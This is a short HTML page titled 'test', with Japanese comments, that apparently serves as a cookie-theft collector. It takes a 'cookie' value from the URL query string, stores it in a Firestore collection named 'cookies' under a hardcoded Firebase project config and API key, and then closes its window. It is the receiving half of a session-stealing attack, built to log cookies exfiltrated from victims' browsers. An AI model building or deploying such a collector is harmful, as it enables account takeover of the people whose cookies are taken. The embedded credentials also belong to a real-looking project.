<!DOCTYPE html>
<html>
<head>
  <title>test</title>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore-compat.js"></script>
</head>
<body>
  <div id="result"></div>
  <script>
    // Firebaseの設定
    const firebaseConfig = {
      apiKey: "AIzaSyBBbo6xLhmufq0LiFaw8bKTDQ9JOthd0HY",
      authDomain: "lets-go-to-school-server.firebaseapp.com",
      databaseURL: "https://lets-go-to-school-server-default-rtdb.firebaseio.com",
      projectId: "lets-go-to-school-server",
      storageBucket: "lets-go-to-school-server.appspot.com",
      messagingSenderId: "149825716219",
      appId: "1:149825716219:web:0ef095d5d77ab10b29155e",
      measurementId: "G-SJJ81FP9VS"
    };

    // Firebaseの初期化
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // URLからクエリパラメータを取得
    const urlParams = new URLSearchParams(window.location.search);
    const cookie = urlParams.get('cookie');

    // Firestoreにデータを送信
    if (cookie) {
      db.collection("cookies").add({
        cookie: cookie // パラメータ名をcookieに変更
      })
      .then((docRef) => {
        document.getElementById("result").innerHTML = "Document written with ID: " + docRef.id;
      })
      .catch((error) => {
        document.getElementById("result").innerHTML = "Error adding document: " + error;
      });
    } else {
      document.getElementById("result").innerHTML = "Cookie parameter is missing.";
    }
    window.close()
  </script>
</body>
</html>
